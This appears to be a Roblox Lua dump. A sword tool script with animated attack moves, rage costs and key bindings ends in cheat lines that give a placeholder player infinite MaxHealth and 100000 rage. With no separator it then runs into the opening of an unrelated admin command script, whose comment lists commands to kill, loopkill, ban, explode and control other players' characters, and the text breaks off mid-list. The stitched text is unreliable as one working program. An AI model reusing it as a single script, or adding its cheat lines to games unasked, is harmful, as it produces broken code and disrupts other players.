RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(((-90)+ally)*i),0)
Torw.C1 = ca(0,mr(-90*i),0)
wait()
end
Torw.C1 = ca(0,0,0)
Anim.Act = false
end
-------
Anims.Boomerang = function(i1,i2,is,RaigCost)
MinusRage(RaigCost)
local lolpos = (Head.Position - mouse.hit.p).unit
local allx = (lolpos.y*80)-10
Anim.Act = true
for i=i1,i2,is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(60*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-60*i),0)
Torw.C1 = ca(0,mr(-60*i),0)
H1w.C0 = cf(0,-1.1,0) *ca(mr(80*i),0,0)
wait()
end
DebounceSpeed = DebounceSpeed - (0.5*Speed)
Left = true
Right = true
Dash(Blad1,3.8/Speed,nil,2)
Dash(Blad2,3.8/Speed,nil,2)
H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,-0.4,0) *ca(mr(-90),0,0)
local soundtime = 0
for i=i1,i2,is/2 do
if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
H1w.C0 = cf(10*i,-1.1+(-15*i),0) *ca(mr(90),mr(720*i),0)
wait()
end
for i=i1,i2,is/2 do
if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
H1w.C0 = cf(10+(-20*i),-16.1,0) *ca(mr(90),mr(720*i),0)
wait()
end
for i=i1,i2,is/2 do
if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end
H1w.C0 = cf(-10+(10*i),-16.1+(15*i),0) *ca(mr(90),mr(720*i),0)
wait()
end
H1w.C0 = cf(0,-1.1,0) *ca(0,0,0) H1w.C1 = cf(0,0,0) *ca(mr(-90),0,0)
DebounceSpeed = DebounceSpeed + (0.5*Speed)
Left = false
Right = false
for i=i2,i1,-is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(60*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(allx*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-60*i),0)
Torw.C1 = ca(0,mr(-60*i),0)
H1w.C0 = cf(0,-1.1,0) *ca(mr(80*i),0,0)
wait()
end
Torw.C1 = ca(0,0,0)
Anim.Act = false
end
Anims.BoulderForce = function(i1,i2,is,RaigCost)
MinusRage(RaigCost)
Anim.Act = true
for i=i1,i2,is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
Torw.C1 = ca(0,mr(50*i),0)
wait()
end
local bould = p(workspace,"Block",4,4,8,true,true,0,0,"Medium stone grey") bould.Name = "Boulder" bould.Material = "Concrete"
local rm = RockMesh:Clone() rm.Scale = Vector3.new(3,3,4.8) rm.Parent = bould
bould.Elasticity = 0 bould.Friction = 2 bould.CFrame = cf(Torso.Position.x+(math.random(-14,14)),Torso.Position.y-5,Torso.Position.z+(math.random(-14,14))) *CFrame.Angles(math.random(-33,33)/10,math.random(-33,33)/10,math.random(-33,33)/10)
local warpdes = true
local bpos = bould.Position
Sound(Sounds.Cast,0.95,0.8)
coroutine.resume(coroutine.create(function() repeat Functions.BrickWarpDesign(bould,9) wait() until warpdes == false end))
for i=0,1,0.08 do bould.CFrame = CFrame.new(bpos.x,bpos.y,bpos.z) + Vector3.new(0,20*i,0) wait() end wait(1) bould.CFrame = CFrame.new(bpos.x,bpos.y+20,bpos.z) bould.CFrame = cf(bould.Position,mouse.hit.p)
bould.Anchored = false wait() bould.Velocity = bould.CFrame.lookVector *(math.random(180,350)) bould.Touched:connect(function(hit) Functions.BoulderTouch(hit,bould) end)
wait(0.5)
warpdes = false
game.Debris:AddItem(bould,10)
for i=i2,i1,-is do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
Torw.C1 = ca(0,mr(50*i),0)
wait()
end
Torw.C1 = ca(0,0,0)
Anim.Act = false
end
Anims.ForceWave = function(i1,i2,is,RaigCost)
local Hit, hitpos = rayCast(Torso.Position,((Torso.Position - Vector3.new(0,10000,0)) - Torso.Position),999.999,Player.Character)
if Hit == nil then Anim.Act = false return end
MinusRage(RaigCost)
Anim.Act = true
lh2,rh2 = FeetWeld(true,Lh,Rh)
local bp2 = Instance.new("BodyPosition",Torso)
bp2.maxForce = Vector3.new(0,math.huge,0)
Humanoid.WalkSpeed = Humanoid.WalkSpeed - (RealSpeed-4)
DebounceSpeed = DebounceSpeed + (1.1*Speed)
bp2.position = Torso.Position + Vector3.new(0,25,0)
Dash(Blad1,2.5/Speed)
Dash(Blad2,2.5/Speed)
local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,0.3,0,BladeColor) wav.Anchored = true
local wavm = BlastMesh:Clone()
wavm.Parent = wav
wavm.Scale = Vector3.new(15,6,15)
local cff = Torso.CFrame - Vector3.new(0,0,0)
coroutine.resume(coroutine.create(function()
Dash(Blad1,4/Speed)
Dash(Blad2,4/Speed)
for i=i1,i2,is*Speed do
LW.C1 = ca(mr(-80+(-100*i)),mr(40-(40*i)),mr(45*i))
LW.C0 = cf(0.6,0.3+(1.4*i),-1+(1*i))
RW.C1 = ca(mr(-80+(-100*i)),mr(-40+(40*i)),mr(-45*i))
RW.C0 = cf(-0.6,0.3+(1.4*i),-1+(1*i))
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
H1w.C0 = cf(0,-1.1+(-0.9*i),0) *ca(0,mr(360*i),0)
H1w.C1 = ca(mr(-90+(40*i)),0,0)
wait()
end for i=i1,i2*3,is*Speed do H1w.C1 = ca(mr(-50),mr(360*i),0) wait() end end)) Sound(Sounds.Cast,0.45,1) for i=i1,i2*5,is do Functions.BrickWarpDesign(Torso,13) wav.CFrame = cff *ca(0,mr(180*i),0) wait() end
for i=1,0.3,-0.14*Speed do wav.Transparency = i wait() end wav:Remove()
for i=i2,i1,-is*Speed do
LW.C1 = ca(mr(-80+(-100*i)),mr(40-(40*i)),mr(45*i))
LW.C0 = cf(0.6,0.3+(1.4*i),-1+(1*i))
RW.C1 = ca(mr(-80+(-100*i)),mr(-40+(40*i)),mr(-45*i))
RW.C0 = cf(-0.6,0.3+(1.4*i),-1+(1*i))
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
H1w.C0 = cf(0,-1.1+(-0.9*i),0) *ca(0,mr(360*i),0)
H1w.C1 = ca(mr(-90+(40*i)),0,0)
wait()
end
bp2:Remove()
local bg = Instance.new("BodyGyro",Torso) bg.maxTorque = Vector3.new(math.huge,0,math.huge)
local bp = Instance.new("BodyPosition",Torso) bp.position = Torso.Position bp.maxForce = Vector3.new(math.huge,1000000,math.huge)
rpos = math.abs(hitpos.y - Torso.Position.y)
rpos = rpos - 1.2
local tpos = Torso.Position
Hum.WalkSpeed = 0
Hum.PlatformStand = true
Dash(Blad2,1.6/Speed,RingMesh.MeshId)
for i=i1,i2,is do
bp.position = tpos - Vector3.new(0,rpos*i,0)
Neck.C0 = cf(0,1-(0.5*i),-0.5*i) *ca(Neck.C1:toEulerAnglesXYZ())
Torw.C1 = ca(mr(20*i),0,0)
Torw.C0 = cf(0,-0.2*i,-0.2*i)
lh2.C0 = cf(-0.5,-1.9+(1*i),-1.1*i) *ca(mr(10*i),mr(90),0)
rh2.C0 = cf(0.5,-1.9+(1*i),0.1*i) *ca(mr(-95*i),mr(-90),0)
LW.C1 = ca(mr(-80+(30*i)),mr(40),0)
LW.C0 = cf(0.6,0.3-(0.3*i),-1+(0.3*i))
RW.C1 = ca(mr(-80+(30*i)),mr(-40),0)
RW.C0 = cf(-0.6,0.3-(0.3*i),-1+(0.3*i))
H1w.C0 = cf(0,-1.1,0) *ca(mr(55*i),0,0)
wait()
end
wait(0.25)
Sound(Sounds.Boom,0.5,1)
Sound(Sounds.EnergyBlast,0.9,1)
Right = true
ShockWave(Torso,50,BladeColor)
wait(1.5)
Right = false
local t2pos = Torso.Position
for i=i2,i1,-is do
bp.position = t2pos - Vector3.new(0,1.5-(1.5*i),0)
Neck.C0 = cf(0,1-(0.5*i),-0.5*i) *ca(Neck.C1:toEulerAnglesXYZ())
Torw.C1 = ca(mr(20*i),0,0)
Torw.C0 = cf(0,-0.2*i,-0.2*i)
lh2.C0 = cf(-0.5,-1.9+(1*i),-1.1*i) *ca(mr(10*i),mr(90),0)
rh2.C0 = cf(0.5,-1.9+(1*i),0.1*i) *ca(mr(-95*i),mr(-90),0)
LW.C1 = ca(mr(-80+(30*i)),mr(40),0)
LW.C0 = cf(0.6,0.3-(0.3*i),-1+(0.3*i))
RW.C1 = ca(mr(-80+(30*i)),mr(-40),0)
RW.C0 = cf(-0.6,0.3-(0.3*i),-1+(0.3*i))
H1w.C0 = cf(0,-1.1,0) *ca(mr(55*i),0,0)
wait()
end
DebounceSpeed = DebounceSpeed - (1.1*Speed)
bp:Remove()
bg:Remove()
Hum.PlatformStand = false
Hum.WalkSpeed = RealSpeed
Torw.C1 = ca(0,0,0)
Anim.Act = false
Lh,Rh = FeetWeld(false,lh2,rh2)
end
Anims.DualSpin = function(i1,i2,is,RaigCost)
MinusRage(RaigCost)
Anim.Act = true
for i=i1,i2,is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-180-(-90*i)),mr(0*i)) H1w.C1 = ca(mr(-90-(60*i)),0,mr(0*i))
H2w.C0 = cf(0,-1.1,0) *ca(0,mr(180-(270*i)),mr(0*i)) H2w.C1 = ca(mr(-90+(-30*i)),0,0)
LW.C1 = ca(mr(-60+(-40*i)),mr(-30+(-75*i)),mr(0*i))
LW.C0 = cf(0.13*i,0.5*i,-0.5+(0.5*i))
RW.C1 = ca(mr(-60+(-20*i)),mr(30+(45*i)),mr(0*i))
RW.C0 = cf(0.13*i,0.4*i,-0.5+(0.4*i))
wait()
end
DebounceSpeed = DebounceSpeed - (0.5*Speed) Right = true Left = true Dash(Blad1,2.6/Speed,nil,2) Dash(Blad2,2.6/Speed,nil,2) local x,y,z = Neck.C0:toEulerAnglesXYZ()
local soundtime = 0
for i=i1,i2*4,is*Speed do if soundtime == 10 then soundtime = 0 Sound(Sounds.SaberSlash,2.5,0.5) else soundtime = soundtime + 1 end Torw.C1 = ca(0,mr(i*360),0) Neck.C0 = cf(0,1,0) *ca(x,y,z+mr(-360*i)) wait() end Neck.C0 = cf(0,1,0) *ca(x,y,z)Torw.C1 = ca(0,0,0)
DebounceSpeed = DebounceSpeed + (0.5*Speed) for i=i2,i1,-is*Speed do
H1w.C0 = cf(0,-1.1,0) *ca(0,mr(-180-(-90*i)),mr(0*i)) H1w.C1 = ca(mr(-90-(60*i)),0,mr(0*i))
H2w.C0 = cf(0,-1.1,0) *ca(0,mr(180-(270*i)),mr(0*i)) H2w.C1 = ca(mr(-90+(-30*i)),0,0)
LW.C1 = ca(mr(-60+(-40*i)),mr(-30+(-75*i)),mr(0*i))
LW.C0 = cf(0.13*i,0.5*i,-0.5+(0.5*i))
RW.C1 = ca(mr(-60+(-20*i)),mr(30+(45*i)),mr(0*i))
RW.C0 = cf(0.13*i,0.4*i,-0.5+(0.4*i))
wait()
end Right = false Left = false
Anim.Act = false
end
 
----------------------------
----------------------------
----------------------------
----------------------------
 
Lh = Torso["Left Hip"]
Rh = Torso["Right Hip"]
 
Functions = {}
Functions.BoulderTouch = function(hit2,bould)
print(bould.Name)
for i,v in pairs(workspace:GetChildren()) do
if v ~= Char and v ~= nil and v:findFirstChild("Torso") ~= nil and v:findFirstChild("Humanoid") ~= nil then
if math.abs((v.Torso.Position-bould.Position).magnitude) < 11 and ft(RightDebounce,v.Name) == nil then
Sound(Sounds.Smash,1,1)
Dmgz(v.Humanoid,Damage["BoulderForce"])
table.insert(RightDebounce,v.Name)
print(v.Name)
coroutine.resume(coroutine.create(function()wait(DebounceSpeed) local nf = ft(RightDebounce,v.Name) if nf ~= nil then table.remove(RightDebounce,nf) end end))
end
else
if v ~= bould and v:IsA("BasePart") and v.Anchored == false and math.abs((v.Position-bould.Position).magnitude) < 11 then v:BreakJoints() v.Velocity = cf(bould.Position,v.Position).lookVector*10 + Vector3.new(0,10,0) end
end
end -- for
end
Functions.Sparkle = function(bb,scal,si)
if si == nil then si = 1 end
local rand = bb.Position + Vector3.new(math.random(-scal,scal),math.random(-scal,scal),math.random(-scal,scal))
local np = p(Torm,"Block",0.1,0.1,0.1,false,true,0.1,0.2,BladeColor)
np.CFrame = cf(rand.x,rand.y,rand.z) *ca(math.random(-33,33)/10,math.random(-33,33)/10,math.random(-33,33)/10)
local dm = DiamondMesh:Clone() dm.Scale = Vector3.new(0,0,0) dm.Parent = np
coroutine.resume(coroutine.create(function()
for i=0,1*si,0.1*si do
dm.Scale = Vector3.new(1*i,1.25*i,1*i)
wait()
end
end))
coroutine.resume(coroutine.create(function()
wait(0.1)
for i=0,1,0.1 do
np.Transparency = i
wait()
end
np:Remove()
end))
end
Functions.BrickWarpDesign = function(bb,scal)
local rand = bb.Position + Vector3.new(math.random(-scal,scal),math.random(-scal,scal),math.random(-scal,scal))
local mag = (rand - bb.Position).magnitude
local np = p(Torm,"Block",0.1,0.1,mag-3,false,true,0.1,0.2,BladeColor)
np.CFrame = cf(bb.Position,rand)
np.CFrame = np.CFrame + np.CFrame.lookVector*((scal/5)+(mag/2))
coroutine.resume(coroutine.create(function()
for i=0.1,1,0.05 do
np.Transparency = i
wait()
end
np:Remove()
end))
end
Functions.RageRegen = function()
local lostcontrol = false
local hpos = Torso.Position.y + 10
Anim.Move = "RageRegening"
Anim.Act = true
local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,1,0,BladeColor) wav.Anchored = true
local wavm = BlastMesh:Clone()
wavm.Parent = wav
local wavv = 0
wavm.Scale = Vector3.new(5,3.5,5)
wav.CFrame = cf((Torso.CFrame * CFrame.new(0,-2.5,0)).p) *ca(0,mr(wavv),0)
local bp = Instance.new("BodyPosition",Torso)
bp.maxForce = Vector3.new(0,math.huge,0)
Humanoid.WalkSpeed = Humanoid.WalkSpeed - (RealSpeed-4)
bp.position = Torso.Position + Vector3.new(0,10,0)
local bpos = bp.position
coroutine.resume(coroutine.create(function()
lh2,rh2 = FeetWeld(true,Lh,Rh)
if SwordType == "Single" then
for i=0,1,0.1*Speed do
LW.C1 = ca(mr(-80+(-30*i)),mr(40-(40*i)),0)
LW.C0 = cf(0.6-(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(120*i),0)
RW.C1 = ca(mr(-80+(-30*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(-120*i),0)
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
wait()
end
else
for i=0,1,0.1*Speed do
LW.C1 = ca(mr(-60+(-50*i)),mr(-40-(-40*i)),0)
LW.C0 = cf(-0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(120*i),0)
RW.C1 = ca(mr(-60+(-50*i)),mr(40+(-40*i)),0)
RW.C0 = cf(0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(-120*i),0)
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
wait()
end
end
local function movezx(i1,i2,is,bp)
if SwordType == "Single" then
for i=i1,i2,is*Speed do
LW.C1 = ca(mr(-120+(20*i)),0,0)
LW.C0 = cf(0,0.8,0.7) *ca(0,mr(120+(20*i)),0)
RW.C1 = ca(mr(-120+(20*i)),0,0)
RW.C0 = cf(0,0.8,0.7) *ca(0,mr(-120+(-20*i)),0)
lh2.C1 = ca(mr(30+(-15*i)),0,mr(15+(-8*i)))
rh2.C1 = ca(mr(30+(-15*i)),0,mr(-15+(8*i)))
lh2.C0 = cf(-0.7,-1.9,0.35)
rh2.C0 = cf(0.7,-1.9,0.35)
bp.position = Vector3.new(bpos.x,(hpos+10)+(3*i),bpos.z)
wait()
end
else
for i=i1,i2,is*Speed do
LW.C1 = ca(mr(-110),mr(0),0)
LW.C0 = cf(-0.1,0.8,0.7) *ca(0,mr(120+(20*i)),0)
RW.C1 = ca(mr(-110),mr(0),0)
RW.C0 = cf(0.1,0.8,0.7) *ca(0,mr(-120+(-20*i)),0)
lh2.C1 = ca(mr(30+(-15*i)),0,mr(15+(-8*i)))
rh2.C1 = ca(mr(30+(-15*i)),0,mr(-15+(8*i)))
lh2.C0 = cf(-0.7,-1.9,0.35)
rh2.C0 = cf(0.7,-1.9,0.35)
bp.position = Vector3.new(bpos.x,(hpos+10)+(3*i),bpos.z)
wait()
end
end
end
local moved = 2
repeat
if Rage >= MaxRage or Anim.key.z == false then break end
if moved == 2 then moved = 1 movezx(0,1,0.025,bp) else moved = 2 movezx(1,0,-0.025,bp) end
until Rage >= MaxRage or Anim.key.z == false or lostcontrol == true
if SwordType == "Single" then
for i=1,0,-0.1*Speed do
LW.C1 = ca(mr(-80+(-30*i)),mr(40-(40*i)),0)
LW.C0 = cf(0.6-(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(120*i),0)
RW.C1 = ca(mr(-80+(-30*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.6*i),0.3+(0.5*i),-1+(1.7*i)) *ca(0,mr(-120*i),0)
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
wait()
end
else
for i=1,0,-0.1*Speed do
LW.C1 = ca(mr(-60+(-50*i)),mr(-40-(-40*i)),0)
LW.C0 = cf(-0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(120*i),0)
RW.C1 = ca(mr(-60+(-50*i)),mr(40+(-40*i)),0)
RW.C0 = cf(0.1,0.8*i,-0.5+(1.2*i)) *ca(0,mr(-120*i),0)
lh2.C1 = ca(mr(30*i),0,mr(15*i))
rh2.C1 = ca(mr(30*i),0,mr(-15*i))
lh2.C0 = cf(-0.5+(-0.2*i),-1.9,0.35*i)
rh2.C0 = cf(0.5+(0.2*i),-1.9,0.35*i)
wait()
end
end
Lh,Rh = FeetWeld(false,lh2,rh2)
wait(0.6)
Anim.Act = false
Anim.Move = "None"
end))
for i=1,0.3,-0.14*Speed do wav.Transparency = i wait() end
rpos = 0
Sound(Sounds.Cast,0.8,1)
repeat wait()
local Hit, hitpos = rayCast(Torso.Position,((Torso.Position - Vector3.new(0,10000,0)) - Torso.Position),999.999,Player.Character)
if Hit == nil then lostcontrol = true break end
hpos = hitpos.y if math.random(1,6) == 4 then Functions.Sparkle(Torso,8) end
if math.random(1,3) == 3 then Functions.BrickWarpDesign(Torso,10) end wavv = wavv + 10 Rage = Rage - (RageCost["RageRegening"]*RageIncome)
wav.CFrame = cf(Torso.Position.x,hpos+1.4,Torso.Position.z) *ca(0,mr(wavv),0)
until Rage >= MaxRage or Anim.key.z == false
for i=0.3,01,0.14*Speed do wav.Transparency = i wait() end wav:Remove()
bp:Remove()
Humanoid.WalkSpeed = Humanoid.WalkSpeed + (RealSpeed-4)
end
Functions.Teleport = function(i1,i2,is,RaigCost)
Anim.Act = true
for i=i1,i2,is*Speed do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
Torw.C1 = ca(0,mr(50*i),0)
wait()
end
local tele = false
local tele2 = false -- for mouse
local mouseact = mouse.Button1Up:connect(function() tele2 = true end)
coroutine.resume(coroutine.create(function() Sound(Sounds.Cast,1.2,1) wait(12) tele = true end))
local telepos = Torso.Position
local telehit = nil
local wav = p(Torm,"Block",0.1,0.1,0.1,true,false,0.3,0.1,BladeColor) wav.Anchored = true
local wavm = BlastMesh:Clone()
wavm.Parent = wav
local wavv = 0
wavm.Scale = Vector3.new(3.5,2,3.5)
repeat
local mpos = mouse.hit.p + Vector3.new(0,2,0)
telehit,telepos = rayCast(mpos,((mpos - Vector3.new(0,10000,0)) - mpos),999.999,Player.Character)
wavv = wavv + 8 Functions.Sparkle(La,3) Functions.BrickWarpDesign(La,4)
if telehit ~= nil then wav.Transparency = 0 wav.CFrame = cf(telepos.x,telepos.y+1,telepos.z) *ca(0,mr(wavv),0) else wav.Transparency = 1 end
wait() until tele == true or tele2 == true mouseact:disconnect()
if telehit == nil or math.abs((Torso.Position - telepos).magnitude) > Props.MaxTeleDistance then
Sound(Sounds.Punch,1,1) for i=0.3,1,0.14 do wavm.Scale = Vector3.new(3.5+(5*i),2,3.5+(5*i)) wav.Transparency = i wait() end wav:Remove()
wav:Remove()
else
MinusRage(RaigCost)
for i=1,10 do wait() Functions.Sparkle(Torso,5,3) Functions.BrickWarpDesign(Torso,6) end
ShockWave(Torso,7,BladeColor)
Torso.CFrame = wav.CFrame + Vector3.new(0,2.2,0) Sound(Sounds.EnergyBlast,1.2,0.6)
ShockWave(Torso,7,BladeColor)
for i=1,10 do wait() Functions.Sparkle(Torso,5,3) Functions.BrickWarpDesign(Torso,6) end
for i=0.3,1,0.14 do wavm.Scale = Vector3.new(3.5+(5*i),2,3.5+(5*i)) wav.Transparency = i wait() end wav:Remove()
end
for i=i2,i1,-is*Speed do
LW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(40+(-40*i)),0)
LW.C0 = cf(0.6+(-0.9*i),0.3,-1+(1*i)) *ca(0,mr(50*i),0)
RW.C1 = cf(0,0.5*i,0) *ca(mr(-80+(-25*i)),mr(-40+(40*i)),0)
RW.C0 = cf(-0.6+(0.9*i),0.3,-1+(1*i)) *ca(0,mr(-50*i),0)
Torw.C1 = ca(0,mr(50*i),0)
wait()
end
Anim.Act = false
end
 
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------
bin.Selected:connect(function(mm)
Mouse = mouse
mouse = mm
Torso["Left Hip"].Part0 = Tor
Torso["Right Hip"].Part0 = Tor
RS.Parent = nil
LS.Parent = nil
RW.Parent = Torso
RW.Part0 = Fra
RW.Part1 = Ra
LW.Parent = Torso
LW.Part0 = Fla
LW.Part1 = La
RW.C0 = CFrame.new(0,0,0) RW.C1 = CFrame.new(0,0,0)
LW.C0 = CFrame.new(0,0,0) LW.C1 = CFrame.new(0,0,0)
Anims.Equip(0,1,0.07*Speed)
Anim.Equipped = true
mouse.KeyDown:connect(function(key)
key:lower()
pcall(function() Anim.key[key:lower()] = true end)
keydown = true
if key == "z" and Anim.Move == "None" and not Anim.Act then
Functions.RageRegen()
end
if SwordType == "Single" then
if key == "e" and Anim.Move == "None" and not Anim.Act and RageCost["RotorBlade"] <= Rage then
Anim.Move = "RotorBlade"
Anims.RotorBlade(0,1,0.08*Speed,RageCost["RotorBlade"])
Anim.Move = "None"
elseif key == "q" and Anim.Move == "None" and not Anim.Act and RageCost["Boomerang"] <= Rage then
Anim.Move = "Boomerang"
Anims.Boomerang(0,1,0.08*Speed,RageCost["Boomerang"])
Anim.Move = "None"
elseif key == "f" and Anim.Move == "None" and not Anim.Act and RageCost["BoulderForce"] <= Rage then
Anim.Move = "BoulderForce"
Anims.BoulderForce(0,1,0.08*Speed,RageCost["BoulderForce"])
Anim.Move = "None"
elseif key == "r" and Anim.Move == "None" and not Anim.Act and RageCost["ForceWave"] <= Rage then
Anim.Move = "ForceWave"
Anims.ForceWave(0,1,0.08*Speed,RageCost["ForceWave"])
Anim.Move = "None"
elseif key == "t" and Anim.Move == "None" and not Anim.Act and RageCost["Teleport"] <= Rage then
Anim.Move = "Teleport"
Functions.Teleport(0,1,0.08*Speed,RageCost["Teleport"])
Anim.Move = "None"
end
elseif SwordType == "Dual" then
if key == "e" and Anim.Move == "None" and not Anim.Act and RageCost["DualSpin"] <= Rage then
Anim.Move = "DualSpin"
Anims.DualSpin(0,1,0.08*Speed,RageCost["DualSpin"])
Anim.Move = "None"
end
end
end)
mouse.KeyUp:connect(function(key)
pcall(function() Anim.key[key:lower()] = false end)
keydown = false
end)
 
mouse.Button1Down:connect(function() Anim.Button = true
if not Anim.Click and Anim.Move == "None" and not Anim.Act then
Anim.Click = true
if Anim.CanBerserk ~= 0 then Anim.CanBerserk = Anim.CanBerserk + 1 end
if Anim.CanBerserk == 0 and RageCost["Berserk"] <= Rage then
Rage = Rage - RageCost["Berserk"]
Anim.ComboBreak = true
Speed = Speed + 0.5
Anim.CanBerserk = Anim.CanBerserk + 1
--Anim.Move = "LeftPunch"
--Anims.LeftPunch(0,1,0.1*Speed,0) Anim.Move = "None"
elseif Anim.CanBerserk == 2 then
Anim.CanBerserk = 0
end
coroutine.resume(coroutine.create(function() local oldcomb = Anim.CanBerserk wait(0.5) if Anim.ComboBreak == true and Anim.CanBerserk == oldcomb then Anim.ComboBreak = false Speed = Speed -0.5 Anim.CanBerserk = 0 end end))
wait(0.1)
Anim.Click = false
end
end)
mouse.Button1Up:connect(function() Anim.Button = false
end)
end)
bin.Deselected:connect(function(mouse)
Anim.Equipped = false
if SwordType == "Dual" then Anims.ChangeToSingle(0,1,0.25*Speed) SwordType = "Single" end
Anims.UnEquip(1,0,-0.08*Speed)
RW.Parent = nil
LW.Parent = nil
RS.Parent = Torso
RS.Part0 = Torso
RS.Part1 = Ra
LS.Parent = Torso
LS.Part0 = Torso
LS.Part1 = La
if Rh.Parent == nil then
FeetWeld(false,Lh,Rh)
end
Torso["Left Hip"].Part0 = Torso
Torso["Right Hip"].Part0 = Torso
end)
Hum.WalkSpeed = RealSpeed
Rage = 100000
wait(5)
Workspace.USERNAME.Humanoid.MaxHealth = math.huge

--Version 2 1.02 I fixed some problems caused by the updates.
adminlist = {"YOUR_NAME_HERE"}--Add in the names of the people you want to be able to use the command script here.
--Please keep my name in there. ;)
bannedlist = { "",""}--If you want someone not to be able to enter your place, put thier name in here.
texture = ""--If you want someone wearing a certain t-shirt to be an admin, put the t-shirt's texture in here.
 
--[[
 I update this command script alot, so if you want to get the newest version of the script, go to http://www.roblox.com/Item.aspx?ID=5277383 every once in a while.
 
If theres anything you think this command script needs, just message me (Person299) and i might put it in. :)
And also, if you find any bugs, report them to me.
 
The commands are,
 
commands
Shows a list of all the commands
 
fix
If the command script breaks for you, say this to fix it
 
kill/Person299
kills Person299
 
loopkill/Person299
Repeatedly kills Person299 when he respawns
 
unloopkill/Person299
Undos loopkill/
 
heal/Person299
Returns Person299 to full health
 
damage/Person299/50
Makes Person299's character take 50 damage
 
health/Person299/999999
Makes Person299's MaxHealth and Health 999999
 
kick/Person299
Removes Person299 from the game, cannot be used by admin/ed people
 
ban/Person299
Removes Person299 from the game and keeps him from reenterring, cannot be used by admin/ed people
 
bannedlist
Shows a list of everyone banned
 
unban/Person299
Unbans Person299
 
explode/Person299
Explodes Person299's character
 
rocket/Person299
Straps a rocket onto Person299's back
 
removetools/Person299
Removes all of Person299's tools.
 
givetools/Person299
Gives Person299 all the tools in StarterPack
 
givebtools/Person299
Gives Person299 the building tools
 
sit/Person299
Makes Person299 sit
 
part/4/1/2
Makes a part with the given dimensions appear over your character
 
respawn/Person299
Makes Person299's character respawn
 
jail/Person299
Makes a lil jail cell around Person299's character
 
unjail/Person299
Undos jail/
 
punish/Person299
Puts Person299's character in game.Lighting
 
unpunish/Person299
Undos punish/
 
merge/Person299/Farvei
Makes Person299 control Farvei's character
 
teleport/Person299/nccvoyager
Teleports Person299's character to nccvoyager's character
 
control/Person299
